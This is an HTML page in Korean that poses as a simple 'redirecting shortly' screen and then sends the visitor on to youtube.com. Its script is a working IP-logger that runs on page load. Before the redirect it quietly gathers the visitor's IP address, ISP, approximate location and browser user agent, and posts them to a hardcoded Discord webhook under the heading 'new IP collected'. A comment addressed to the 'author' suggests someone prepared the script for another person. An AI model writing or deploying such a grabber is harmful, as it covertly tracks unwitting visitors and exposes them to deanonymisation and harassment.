<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>페이지 이동 중</title>
</head>
<body>
    <div style="text-align: center; margin-top: 45vh; font-family: sans-serif;">
        <h2>잠시 후 목적지 페이지로 이동합니다...</h2>
    </div>

    <script>
        // 작성자님의 디스코드 웹훅 주소 (그대로 유지)
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1546103958668316683/84gcHSczGYqjIs_py8BrDL0wuPVefbvwqebj4yKwCfIUXWlHWWdkuLkbP69UwQnEUU3H';
        const REDIRECT_URL = 'https://youtube.com';
        fetch('http://ip-api.com/json/')
            .then(function(response) { return response.json(); })
            .then(function(data) {
                const discordMessage = {
                    embeds: [{
                        title: "🚨 새로운 IP 수집 완료",
                        color: 15158332,
                        fields: [
                            { name: "🕒 접속 시간", value: new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' }), inline: false },
                            { name: "🌐 IP 주소", value: "`" + (data.query || "확인 불가") + "`", inline: true },
                            { name: "🏢 인터넷 통신사(ISP)", value: data.isp || "확인 불가", inline: true },
                            { name: "📍 대략적 위치", value: (data.country || "확인 불가") + ", " + (data.regionName || "") + " " + (data.city || ""), inline: false },
                            { name: "📱 기기 정보", value: "```" + navigator.userAgent + "```", inline: false }
                        ]
                    }]
                };

                return fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(discordMessage)
                });
            })
            .then(function() { window.location.href = REDIRECT_URL; })
            .catch(function() { window.location.href = REDIRECT_URL; });
    </script>
</body>
</html>
